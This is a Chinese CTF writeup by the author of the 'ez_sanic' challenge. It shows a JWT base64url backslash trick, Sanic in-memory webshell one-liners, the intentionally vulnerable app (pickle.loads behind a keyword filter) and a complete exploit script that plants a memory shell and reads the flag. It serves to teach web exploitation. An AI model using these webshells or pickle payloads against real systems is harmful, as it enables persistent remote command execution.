+++
title = "I春秋夏季赛ez_sanic"
slug = "ichunqiu-summer-ez-sanic"
description = "简单题用心拼好题"
date = "2025-07-15T20:16:08"
lastmod = "2025-07-15T20:16:08"
image = ""
license = ""
categories = ["赛题"]
tags = ["sanic", "出题"]
+++

## 说在前面

![1](QQ20250715-201917.jpg)

很简单的一道题，但是不知道为什么零解，周末参加L3HCTF去了，也没看这比赛参赛人数怎么样。但是本着出题就是推进大家学习最近出题人研究的好玩的东西，所以我打算公开本次WP

## 做题的前置知识

### JWT Base64URL Vul

某天我在一道题里面了解到的一个解析漏洞，其中利用代码大致如下

```python
from jwt.utils import base64url_decode

if base64url_decode('''eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9''')== base64url_decode('''eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9\\'''):
    print(11)


```

我们跟进到`base64url_decode`函数

```python
def base64url_decode(input: Union[bytes, str]) -> bytes:
    input_bytes = force_bytes(input)

    rem = len(input_bytes) % 4

    if rem > 0:
        input_bytes += b"=" * (4 - rem)

    return base64.urlsafe_b64decode(input_bytes)
```

首先就是强制转化成`utf-8`字节，然后正常进行base64长度区分，如果不对进行补全。看着任何漏洞都没有，但是某次测试中，发现`\`居然能够相等！

### sanic内存马

python的内存马大家都知道吧，我某天晚上睡不着看了看好友asalin的文章，发现了这篇文章

https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/

最经典的就是进行路由添加

```
app.add_route(lambda request: __import__("os").popen(request.args.get("cmd")).read(),"/shell", methods=["GET"])
```

不多讲，看看另外两个demo

```
app.exception(Exception)(lambda request, exception: __import__("sanic").response.text(__import__("os").popen(request.args.get("cmd")).read()))

app.exception(NotFound)(lambda request, exception: __import__("sanic").response.text(__import__("os").popen(request.args.get("cmd")).read()))
```

我们可以这么理解，利用一个渲染器定义一个函数，其中嵌套一个`lambda`函数，并且此处可控的话，我们可以添加恶意代码，即为一个内存马，系统不重启无法失效~

那我们类似的找个渲染器即可，这里我找到了好几个，禁用了其他的我找到了，保留了一个作为预期解，详情看

https://baozongwi.xyz/posts/cb7dd2e7.html

## 解题

```python
import base64, pickle, jwt, os
from sanic import Sanic
from sanic.response import text, html
from difflib import SequenceMatcher

app = Sanic(__name__)
APP_SECRET = os.urandom(32).hex()
jrl = [jwt.encode({"admin": True, "uid": '5201314'}, APP_SECRET, algorithm="HS256")]


def similar(a, b):
    return SequenceMatcher(None, a, b).ratio() > 0.88


def check_waf(payload):
    dangerous_keywords = [b'exception', b'listener', b'get', b'post', b'add_route']
    return not any(k in payload.lower() for k in dangerous_keywords)


def verify_admin(request):
    token = request.cookies.get('session', None).strip().replace('=', '')
    if token in jrl:
        return False
    try:
        payload = jwt.decode(token, APP_SECRET, algorithms=["HS256"])
        return payload.get('admin') == True
    except:
        return False


@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return text('gogogo')


@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user and similar(user.lower(), 'admin'):
        token = jwt.encode({"admin": False, "user": user}, APP_SECRET, algorithm="HS256")
        resp = text("login success")
        resp.cookies["session"] = token
        return resp
    return text("login fail")


@app.route("/src")
async def src(request):
    return text(open('app.py').read())


@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if not verify_admin(request):
        return text("forbidden")

    cmd = request.form.get('cmd')
    if cmd:
        try:
            decoded_cmd = base64.b64decode(cmd)
            if not check_waf(decoded_cmd):
                return text("WAF: Dangerous keywords detected!")
            pickle.loads(decoded_cmd)
        except Exception as e:
            return text(f"Error: {str(e)}")

    return text("gogogo")


@app.route('/jrl', methods=['GET'])
async def jrl_endpoint(request):
    return text(str(jrl))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)


```

代码逻辑很简单，作为一个不被喷的出题人，出的题就是分享trick，没必要去代审那么一两百行的代码，你要我做代审，那你就给个0day来审项目，自己写个屎山，让大家来看，实在是不太优美

exp如下

```python
#!/usr/bin/env python3
import pickle
import base64
import requests
import sys
import re


def exploit(url):
    """执行完整的攻击流程"""

    if not url.startswith('http'):
        url = 'http://' + url

    print(f"[*] 目标: {url}")

    try:
        print("[1] 获取 JRL 中的 admin token...")
        r1 = requests.get(url + '/jrl', timeout=10)
        admin_token = r1.text.strip("[]'\"") + '\\\\'
        print(f"[+] Admin token: {admin_token[:50]}...")

        print("[2] 生成 pickle 载荷...")

        class Shell:
            def __reduce__(self):
                return (eval, ('app.middleware("request")(lambda r: __import__("os").popen("/readflag").read())',))

        payload = base64.b64encode(pickle.dumps(Shell())).decode()
        print(f"[+] Payload 生成完成")

        print("[3] 植入内存马...")
        headers = {'Cookie': f'session={admin_token}'}
        data = {'cmd': payload}
        r2 = requests.post(url + '/admin', headers=headers, data=data, timeout=10)

        if 'Error' in r2.text:
            print(f"[-] 植入失败: {r2.text}")
            return False
        else:
            print("[+] 内存马植入成功")

        print("[4] 获取 flag...")
        r3 = requests.get(url, timeout=10)

        flag_match = re.search(r'flag\{[^}]+\}', r3.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"[+] 成功获取 Flag: {flag}")
            return flag
        else:
            print(f"[-] 未找到 flag，响应: {r3.text[:100]}")
            return False

    except Exception as e:
        print(f"[-] 攻击失败: {e}")
        return False


def main():
    if len(sys.argv) != 2:
        print("Usage: python exp.py <target_url>")
        print("Example: python exp.py http://127.0.0.1:8000")
        print("Example: python exp.py 127.0.0.1:8000")
        sys.exit(1)

    target_url = sys.argv[1]
    flag = exploit(target_url)

    if flag:
        print(f"\n🎉 SUCCESS! Flag: {flag}")
    else:
        print("\n❌ Failed to get flag")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

